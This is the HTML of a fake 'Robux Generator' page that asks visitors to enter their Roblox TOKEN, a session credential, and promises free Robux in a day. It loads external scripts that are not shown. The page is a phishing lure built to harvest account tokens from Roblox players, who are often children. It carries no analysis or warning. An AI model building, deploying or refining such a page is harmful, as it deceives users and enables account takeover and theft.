<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robux Generator</title>
    <link rel="icon" type="image/png" href="data/image.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="data/css/styles.css">
</head>
<body>
    <div class="roblox-grid"></div>
    <div class="roblox-particles"></div>
    
    <div class="container">
        <div id="main-content">
            <div class="roblox-logo"><img src="data/image.png"></div>
            <h1 id="title">Robux Generator</h1>
            <p class="subtitle" id="subtitle">Enter your TOKEN to generate your Robux</p>
            
            <div class="form-container">
                <input type="text" id="username" placeholder="Your Roblox TOKEN...">
                <button class="generate-btn" id="generateBtn" onclick="generatePoints()">
                    <span id="btnText">Generate Robux</span>
                </button>
            </div>
        </div>

        <div class="loading-container" id="loadingContainer">
            <div class="loading-text" id="loadingText">Generating Robux...</div>
            <div class="loading-bar-container">
                <div class="loading-bar" id="loadingBar"></div>
            </div>
            <div class="loading-subtext" id="loadingSubText">Please wait...</div>
        </div>

        <div class="success-container" id="successContainer">
            <div class="success-icon">âœ“</div>
            <h2 id="congratsText">Congratulations!</h2>
            <div class="points-display" id="pointsDisplay">
                <span class="robux-icon"></span>0
            </div>
            <div class="success-message" id="successMessage">
                Your Robux will arrive in 1 day!
            </div>
        </div>

        <div class="error-message" id="errorMessage"></div>
    </div>

    <script src="data/js/script.js"></script>
    <script src="data/js/scripts.js"></script>
</body>
</html>
